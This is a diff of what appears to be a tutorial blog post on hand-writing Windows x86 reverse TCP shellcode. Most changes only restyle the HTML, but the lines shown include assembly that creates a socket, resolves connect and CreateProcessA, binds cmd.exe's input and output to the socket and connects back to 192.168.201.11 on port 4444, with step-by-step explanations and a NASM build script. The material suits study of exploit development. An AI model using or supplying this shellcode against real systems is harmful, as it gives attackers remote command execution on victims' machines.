@@ -66,7 +66,6 @@ In order to figure out that the above code works well, we must perform some debu
 </p>
 
 ```c
-
 #include <windows.h>
 
 int main(int argc, char* argv[])
@@ -496,13 +495,10 @@ Function parameters :
 
 * A set of flags used to specify additional socket attributes.
 
-
-
-<dl>
-<dd style=text-align:justify>
+<p align="justify">
 
 This function creates a socket. The following arguments passed to the function
-<br><br>
+</p>
 
 <ul>
   <li>2 == AF_INET (IPv4)</li>
@@ -513,9 +509,9 @@ This function creates a socket. The following arguments passed to the function
   <li>NULL == no value for dwFlags</li>
 </ul>
 
-
+<p align="justify">
  The following assembly code implements the <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code> function 
-<br><br>
+</p>
 
 ```c
 ;call WSASocketA
@@ -533,21 +529,25 @@ CALL EAX           ;call WSASocketA
 XCHG EAX, ECX      ;save socket descriptor into ecx in orddr to use it later
 
 ```
+
+<p align="justify">
 At the first line we zero out <code  style="background-color: lightgrey; color:black;"><b>ecx</b></code> register, and after that because we dont need additional socket attributes, we set the <code  style="background-color: lightgrey; color:black;"><b>dwFlags</b></code> argument with a null value. At the third line, because we dont want to perform  any socket group operation, we are pushing the zero value on the stack. In the same manner, at the fourth line, we dont need to define characteristics to the new socket, so we are pushing the null value on the stack. Furthermore, at the fifth line, we are setting the protocol to be used. Here we are using <code  style="background-color: lightgrey; color:black;"><b>TCP</b></code>. At lines 6-7, we are setting the type parameter to <code  style="background-color: lightgrey; color:black;"><b>SOCKET_STREAM (TCP)</b></code>. At lines 8-9, we are setting the internet protocol version 4 (IPv4). At the 10th line, we execute <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code>. At the 11th line, we are saving the socket descriptor to <code  style="background-color: lightgrey; color:black;"><b>ecx</b></code> register in order to use it later.   
+</p>
 
 
-<br><br>
 <b><span style="color:black;font-size:20px">Get connect using GetProcAddress</span></b>
-<br><br>
+
+<p align="justify">
 At this point we are ready to search for the address of connect function.
-<br><br>
+</p>
+
 <ul>
   <li><code  style="background-color: lightgrey; color:black;"><b>connect</b></code></li>
 </ul>
 
-
+<p align="justify">
 The following assembly code will be used in order to find the address of the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function 
-<br><br>
+</p>
 
 ```c
 ;; Find the address of connect 
@@ -566,17 +566,17 @@ XCHG ECX, EBP                        ;save socket descriptor to EBP registry for
 CALL EDX                             ;call GetProcAddress                
 ```
 
+<p align="justify">
 At the first line, <code  style="background-color: lightgrey; color:black;"><b>edi</b></code> register has the address of <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code>. At the second line, we are aligning the stack. At lines 3-6, we are getting the address of the <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function. At lines 7-9, we are pushing the string, <b>"connect"</b>, in reverse order due to little endian format. At the tenth line, we are pushing the second argument of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> which is the name of the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function. This is done by pushing the <code  style="background-color: lightgrey; color:black;"><b>esp</b></code> register on the stack. Then, we push the first argument of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> on the stack, which is the <code  style="background-color: lightgrey; color:black;"><b>ws32_2.dll</b></code> address. Afterwards, we are saving the socket descriptor we have aquired earlier into the <code  style="background-color: lightgrey; color:black;"><b>ebp</b></code> register to use it later. Then we call <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> and then the address of <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function will be returned in <code  style="background-color: lightgrey; color:black;"><b>eax</b></code> register    
+</p>
 
-<br><br>
 <b><span style="color:black;font-size:20px">Call the connect function</span></b>
-<br><br>
 
+<p align="justify">
 Next, we implement the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function. According to Microsoft Docs, the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function establishes a connection to a specified socket. 
+</p>
 
-<br><br>
-<code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function prototype :
-<br><br>
+<code style="background-color: lightgrey; color:black;"><b>connect</b></code> function prototype :
 
 ```c
 int WSAAPI connect(
@@ -585,9 +585,10 @@ int WSAAPI connect(
   int            namelen
 );
 ```
-</dd></dl>
 
+<p align="justify">
 Function parameters : 
+</p>
 
 > s
 
@@ -601,10 +602,9 @@ Function parameters :
 
 * The length, in bytes, of the <code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure pointed to by the name parameter.
 
-<dl>
-<dd style=text-align:justify>
+<p align="justify">
 The following code implements the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function  
-<br><br>
+</p>
 
 ```c
 ;call connect
@@ -621,22 +621,25 @@ XCHG EBP, EDI            ;save socket descriptor to EDI to use it later
 CALL EAX                 ;execute connect;
 ```
 
+<p align="justify">
 At lines 1-6, we are setting the <code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure ( <code  style="background-color: lightgrey; color:black;"><b>Port</b></code>, <code  style="background-color: lightgrey; color:black;"><b>IP</b></code>, <code  style="background-color: lightgrey; color:black;"><b>Protocol</b></code> ) and then the <code  style="background-color: lightgrey; color:black;"><b>edx</b></code> register will hold the pointer of <code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure. Afterwards, at lines 7-9, we are setting the arguments of the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function in reverse order. First we push the size of the <code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure on the stack, then we push the address of the<code  style="background-color: lightgrey; color:black;"><b>sockaddr</b></code> structure on the stack and finally we also push on the stack, the socket descriptor that was saved before into <code  style="background-color: lightgrey; color:black;"><b>ebp</b></code>. Afterwards, before we execute <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function, we save the socket descriptor into <code  style="background-color: lightgrey; color:black;"><b>edi</b></code> for later use. Finally, we call <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function.
+</p>
 
 
-<br><br>
 <b><span style="color:black;font-size:20px">Get CreateProcessA using GetProcAddress</span></b>
-<br><br>
 
+<p align="justify">
 At this point we will search for the address of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function. 
-<br><br>
+</p>
+
 <ul>
     <li> <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code></li>
 </ul>
 
+<p align="justify">
 The following assembly code will be used in order to find the address of the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function
+</p>
 
-<br><br>
 ```c
 ;; Find the address of CreateProcessA
 ADD  ESP,0x14                        ;Clean stack
@@ -657,19 +660,22 @@ PUSH EAX                             ;address of CreateProcessA
 LEA EBP, [EAX]                       ;EBP now points to the address of CreateProcessA
 ```
 
+<p align="justify">
 At the first line we are aligning the stack. Then, at lines 2-5 we are getting the address of the <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function. At lines 6-11, we are pushing onto the stack,  the second argument of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function in reverse order, which sets the string <b>"CreateProcessA"</b>. In order to do that, we are first pushing the string <b>"As"</b>, then <b>"seco"</b>, then <b>"rPet"</b> and finally the string <b>"aerC"</b>. Next, <code  style="background-color: lightgrey; color:black;"><b>esp</b></code> regsister points at the top of the stack at the begining o the string <b>"CreateProcessA"</b>. At line 12, we are moving the <code  style="background-color: lightgrey; color:black;"><b>kernel32.dll</b></code> address that was saved inside <code  style="background-color: lightgrey; color:black;"><b>esi</b></code>, into the <code  style="background-color: lightgrey; color:black;"><b>ebp</b></code> register. Then at line 13, we are pushing the first argument of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> into the stack. At line 14, we are calling <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code>. Then, at line 15, the returned address of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function will be saved into the stack. Then the address of <code  style="background-color: lightgrey; color:black;"><b>eax</b></code> will be loaded into the <code  style="background-color: lightgrey; color:black;"><b>ebp</b></code>, which will point to the address of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> register. 
+</p>
 
-<br><br>
+
 <b><span style="color:black;font-size:20px">Call the CreateProcessA function</span></b>
-<br><br>
 
+<p align="justify">
 Next, the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function will be implemented. According to Microsoft Docs, the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function creates a new process and its primary thread. The new process runs in the security context of the calling process.
+</p>
 
+<p align="justify">
 Following we can see the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function prototype 
-<br><br>
+</p>
 
 ```c
-
 BOOL CreateProcessA(
   LPCSTR                lpApplicationName,
   LPSTR                 lpCommandLine,
@@ -682,12 +688,11 @@ BOOL CreateProcessA(
   LPSTARTUPINFOA        lpStartupInfo,
   LPPROCESS_INFORMATION lpProcessInformation
 );
-
 ```
-</dd></dl>
 
-
+<p align="justify">
 Function parameters :
+</p>
 
 >lpApplicationName
 
@@ -732,18 +737,19 @@ Function parameters :
 * A pointer to a <code  style="background-color: lightgrey; color:black;"><b>PROCESS_INFORMATION</b></code> structure that receives identification information about the new process.
 
 
-<dl>
-<dd style=text-align:justify>
+<p align="justify">
 The following code used to impement and call the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function 
-<br><br>
+</p>
+
 ```c
 PUSH 0x61646d63                      ;"admc"
 SUB  dword [ESP + 0x3], 0x61         ;"dmc" (remove "a")
 MOV  ECX, ESP                        ;ecx now points to "cmd" string
 ```
 
+<p align="justify">
 At Lines 1-3 above, the instructions are setting the <code  style="background-color: lightgrey; color:black;"><b>ECX</b></code> register to point to <b>"cmd"</b> string. This is the <code  style="background-color: lightgrey; color:black;"><b>lpProcessInformation</b></code> argument of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code>, and provides the name of the module to be executed
-<br><br>
+</p>
 
 ```c
 XOR  EDX, EDX                        ;zero out EDX
@@ -751,11 +757,12 @@ SUB  ESP, 16
 MOV  EBX, ESP                        ;pointer for ProcessInfo
 ```
 
+<p align="justify">
 As we see at the code above, at the first line we zero out the <code  style="background-color: lightgrey; color:black;"><b>EDX</b></code> register. At lines 2-3, we are setting the <code  style="background-color: lightgrey; color:black;"><b>EBX</b></code> register to point to <code  style="background-color: lightgrey; color:black;"><b>PROCESS_INFORMATION</b></code> structure.
+</p>
 
-<br><br>
 
-```C
+```c
 PUSH EDI                             ;hStdError  => saved socket
 PUSH EDI                             ;hStdOutput => saved socket
 PUSH EDI                             ;hStdInput  => saved socket
@@ -780,8 +787,10 @@ ADD  AL, 44                          ;cb => 0x44 (size of struct)
 PUSH EAX                             ;eax points to STARTUPINFOA
 ```
 
+<p align="justify">
 Later on, as we see at the code above, we continue setting up the <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure. At lines 1-3 above, we are setting up the standard input, the standard output and the standard error by putting the socket file descriptor into the struct members <code  style="background-color: lightgrey; color:black;"><b>hStdInput</b></code>, <code  style="background-color: lightgrey; color:black;"><b>hStdOutput</b></code>, and <code  style="background-color: lightgrey; color:black;"><b>hStdError</b></code>. At the fourth line above, the <code  style="background-color: lightgrey; color:black;"><b>cbReserved2</b></code> is reserved for use by the C run-time and must be zero. Same for <code  style="background-color: lightgrey; color:black;"><b>lpReserved2</b></code> at the fifth line. At lines 6-9, we are setting the <code  style="background-color: lightgrey; color:black;"><b>STARTF_USESTDHANDLES</b></code> struct member with the value <code  style="background-color: lightgrey; color:black;"><b>0x00000100</b></code>. Then, at lines 7-16, All the other values of <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure should be null. At seventeenth line, the <code  style="background-color: lightgrey; color:black;"><b>cb</b></code> member holds the size of the <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure which is <code  style="background-color: lightgrey; color:black;"><b>0x44</b></code> in hex. Then, at eighteenth line, the <code  style="background-color: lightgrey; color:black;"><b>EAX</b></code> register contains a pointer to <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure
-<br><br>
+</p>
+
 
 ```c
 ;;ProcessInfo struct
@@ -801,15 +810,17 @@ PUSH EDX                             ;ApplicationName => NULL
 CALL EBP                             ;execute CreateProcessA 
 ```
 
+<p align="justify">
 At the code above, we are now starting the setup of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function. At lines 1-3 ,we are pushing the pointers of <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> and <code  style="background-color: lightgrey; color:black;"><b>PROCESS_INFORMATION</b></code> structures onto the stack as the two last arguments of the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function. Afterwards, at lines 4-6 we are setting the next three arguments of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function, the <code  style="background-color: lightgrey; color:black;"><b>CurrentDirectory</b></code>, and the <code  style="background-color: lightgrey; color:black;"><b>pEnvironment</b></code> with nulls, and the <code  style="background-color: lightgrey; color:black;"><b>CreationFlags</b></code> with zero. At lines 7-9 , we are setting the InheritHandles to <code  style="background-color: lightgrey; color:black;"><b>TRUE</b></code>, and that, because the <code  style="background-color: lightgrey; color:black;"><b>STARTF_USESTDHANDLES</b></code> was set before with <code  style="background-color: lightgrey; color:black;"><b>0x00000100</b></code>. Next, at lines 10-11, we are setting the <code  style="background-color: lightgrey; color:black;"><b>pThreadAttributes</b></code> and <code  style="background-color: lightgrey; color:black;"><b>pProcessAttributes</b></code> with null. At line 12, we set the pointer to <b>"cmd"</b>. At line 13 , we set the <code  style="background-color: lightgrey; color:black;"><b>ApplicationName</b></code> to null and then we call <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function.
+</p>
 
-<br><br>
+
 <b><span style="color:black;font-size:20px">Full Reverse TCP Shellcode </span></b>
-<br><br>
-The following assembly code represents the code used to perform a reverse tcp socket connection at IP address <code  style="background-color: lightgrey; color:black;"><b>192.168.201.11</b></code> and port <code  style="background-color: lightgrey; color:black;"><b>4444</b></code>
 
-</dd>
-</dl>
+<p align="justify">
+The following assembly code represents the code used to perform a reverse tcp socket connection at IP address <code  style="background-color: lightgrey; color:black;"><b>192.168.201.11</b></code> and port <code  style="background-color: lightgrey; color:black;"><b>4444</b></code>
+</p>
+
 
 ```c
 [BITS 32]
@@ -1038,7 +1049,6 @@ The following bash script <code  style="background-color: lightgrey; color:black
 
 
 ```bash
-
 #!/bin/bash
 
 echo '[+] Assembling with Nasm ... '
@@ -1048,13 +1058,10 @@ echo '[+] Linking ...'
 ld -o $1.exe $1.obj
 
 echo '[+] Done!'
-
 ```
 
 <p align="justify">
-
 Then the shellcode will be produced as follows : 
-
 </p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
